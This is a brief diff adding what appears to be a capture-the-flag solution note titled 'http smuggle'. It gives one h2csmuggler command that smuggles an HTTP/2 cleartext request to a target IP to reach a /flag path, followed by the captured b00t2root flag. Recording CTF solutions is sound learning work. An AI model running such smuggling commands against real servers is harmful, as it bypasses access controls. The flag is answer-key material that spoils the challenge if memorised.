@@ -1,0 +1,4 @@
+http smuggle
+
+python3 h2csmuggler.py -x https://192.34.57.73:8001/ https://192.34.57.73:8001/flag
+	b00t2root{so_you_know_how_to_smuggle}
